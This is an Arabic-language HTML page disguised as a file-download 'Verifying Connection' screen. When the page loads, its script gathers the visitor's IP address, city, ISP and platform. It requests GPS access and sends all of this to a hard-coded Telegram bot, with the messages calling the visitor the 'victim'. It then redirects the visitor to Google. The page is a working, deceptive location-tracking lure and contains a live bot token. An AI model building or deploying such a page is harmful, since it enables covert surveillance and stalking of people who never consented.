<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الملف المطلوب...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-color: #050505; 
            color: #00f3ff; 
            font-family: 'Courier New', Courier, monospace; 
            overflow: hidden;
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
            background-size: 20px 20px;
            z-index: -1;
        }
        .loader {
            border: 2px solid #111;
            border-top: 2px solid #00f3ff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .glitch { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6 text-center">

    <div class="matrix-bg"></div>

    <div class="loader mb-8"></div>
    
    <div class="glass-panel p-8 rounded-2xl border border-cyan-500/20 bg-black/40 backdrop-blur-md max-w-sm">
        <h1 class="text-2xl font-bold mb-4 glitch tracking-widest uppercase">Verifying Connection</h1>
        <p class="text-gray-400 text-sm leading-relaxed">
            جاري فحص بروتوكولات الأمان وفك تشفير رابط التحميل... <br>
            <span class="text-cyan-600 text-[10px]">يرجى السماح بالوصول إذا طلب منك النظام ذلك.</span>
        </p>
        
        <div id="log" class="mt-6 text-[10px] text-left text-cyan-900 font-mono h-20 overflow-hidden">
            > Initializing handshake...<br>
            > Requesting secure tunnel...<br>
            > Encrypting metadata...<br>
            > Waiting for user authentication...
        </div>
    </div>

    <script>
        // البيانات الخاصة بك تم دمجها هنا
        const TELEGRAM_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const CHAT_ID = "1523412137";

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            };
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { 
                console.log("Network error in report delivery.");
            }
        }

        async function getNetworkInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (e) { return null; }
        }

        window.onload = async () => {
            const info = await getNetworkInfo();
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const time = new Date().toLocaleString('ar-EG');

            let report = `🔱 *إشعار رادار 2099*\n\n`;
            report += `👤 *الضحية:* \`${info?.ip || 'IP مخفي'}\`\n`;
            report += `📍 *الموقع:* ${info?.city || 'غير معروف'}, ${info?.country_name || 'غير معروف'}\n`;
            report += `🏢 *المزود:* ${info?.org || 'غير معروف'}\n`;
            report += `📱 *النظام:* ${platform}\n`;
            report += `⏰ *الوقت:* ${time}\n`;
            report += `🔗 *موقع تقريبي:* [فتح الخريطة](https://www.google.com/maps?q=${info?.latitude},${info?.longitude})\n`;

            // إرسال التقرير الأول (IP)
            await sendToTelegram(report);

            // طلب الموقع الدقيق (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    let gpsReport = `🎯 *تم تحديد الموقع الدقيق (GPS)!*\n`;
                    gpsReport += `📍 *الإحداثيات:* \`${lat}, ${lon}\`\n`;
                    gpsReport += `🗺️ *رابط جوجل:* [اضغط هنا للوصول](https://www.google.com/maps?q=${lat},${lon})`;
                    
                    await sendToTelegram(gpsReport);
                    
                    // تحويل الضحية لمكان حقيقي بعد النجاح
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1500);
                }, (error) => {
                    sendToTelegram("⚠️ الضحية رفض إعطاء إذن الـ GPS (تم الاكتفاء بالـ IP).");
                });
            }
        };

        // محاكاة سطر الأوامر
        const log = document.getElementById('log');
        setInterval(() => {
            const lines = [
                "> Scanning open ports...",
                "> Fetching geolocation headers...",
                "> Tunnel established: AES-256",
                "> Signal strength: OPTIMAL",
                "> Data packet sent to node: " + CHAT_ID
            ];
            log.innerHTML += lines[Math.floor(Math.random() * lines.length)] + "<br>";
            if (log.innerHTML.length > 500) log.innerHTML = "";
        }, 1000);
    </script>
</body>
</html>
